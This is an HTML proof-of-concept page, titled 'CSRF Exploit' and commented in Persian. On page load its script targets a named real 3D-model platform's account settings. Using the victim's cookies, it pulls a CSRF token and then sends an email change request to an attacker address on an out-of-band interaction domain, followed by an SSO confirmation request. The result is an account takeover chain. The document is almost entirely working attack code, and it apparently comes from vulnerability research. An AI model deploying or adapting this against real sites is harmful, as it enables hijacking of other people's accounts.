<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <h1>Processing...</h1>
    <p id="status">Initializing...</p>

    <script>
        // تابع استخراج sb_csrftoken از هدر Set-Cookie پاسخ
        async function extractCsrfTokenFromSetCookie() {
            const url = 'https://sketchfab.com/settings/email';
            const response = await fetch(url, {
                method: 'GET',
                credentials: 'include',   // ارسال کوکی‌های موجود
                headers: {
                    'Accept': 'text/html,application/xhtml+xml'
                }
            });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status} - Failed to fetch page`);
            }

            // دریافت هدر Set-Cookie
            const setCookieHeader = response.headers.get('set-cookie');
            if (!setCookieHeader) {
                throw new Error('Set-Cookie header not found in response');
            }

            // استخراج مقدار sb_csrftoken
            // فرمت: sb_csrftoken=6iEeoOXZPvPk2IrfJJ5HcxEGhEy7rShjeyyUuTxg8trRbBQ1KrIHExP1B5qZpgVF; expires=...
            const match = setCookieHeader.match(/sb_csrftoken=([^;]+)/);
            if (!match || !match[1]) {
                throw new Error('sb_csrftoken not found in Set-Cookie header');
            }

            return match[1];
        }

        // تأخیر ساده
        const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

        // درخواست اول: تغییر ایمیل
        async function changeEmail(csrfToken) {
            const url = 'https://sketchfab.com/settings/email/sso-verify-callback';
            const email = 'pouryet3@gmail.com.gzjkg2psu523o7ao6del6o1ib9h050tp.oastify.com'; // 👈 جایگزین کن
            const payload = JSON.stringify({ email: email });

            const response = await fetch(url, {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Csrftoken': csrfToken
                },
                body: payload
            });

            if (!response.ok) return false;
            const data = await response.json();
            return data.success === true;
        }

        // درخواست دوم: تأیید از طریق SSO callback
        async function confirmEmail(csrfToken) {
            const url = 'https://sketchfab.com/social/login/epic/';
            const params = new URLSearchParams({
                'csrfmiddlewaretoken': csrfToken,
                'next': '/settings/email/sso-verify-callback'
            });

            const response = await fetch(url, {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: params,
                redirect: 'follow'   // دنبال کردن خودکار ریدایرکت 302
            });

            return response.redirected || response.ok;
        }

        // اجرای اصلی
        (async function() {
            try {
                document.getElementById('status').innerText = 'Extracting CSRF token from Set-Cookie header...';
                const csrfToken = await extractCsrfTokenFromSetCookie();
                console.log('[+] CSRF token (sb_csrftoken) extracted:', csrfToken);
                document.getElementById('status').innerText = 'Token extracted. Sending email change request...';

                const step1 = await changeEmail(csrfToken);
                if (!step1) throw new Error('First POST (change email) failed');
                document.getElementById('status').innerText = 'Email change initiated. Waiting 2 seconds...';
                await delay(2000);

                document.getElementById('status').innerText = 'Sending confirmation request...';
                const step2 = await confirmEmail(csrfToken);
                if (!step2) throw new Error('Second POST (confirmation) failed');

                document.getElementById('status').innerText = 'Exploit completed!';
                document.body.innerHTML = '<h2 style="color:green">Success! Email address changed.</h2>';
                console.log('[+] Full exploit chain successful');
            } catch (err) {
                console.error('[-] Exploit error:', err);
                document.getElementById('status').innerText = 'Error: ' + err.message;
                document.body.innerHTML += '<p style="color:red">Exploit failed. Check console.</p>';
            }
        })();
    </script>
</body>
</html>
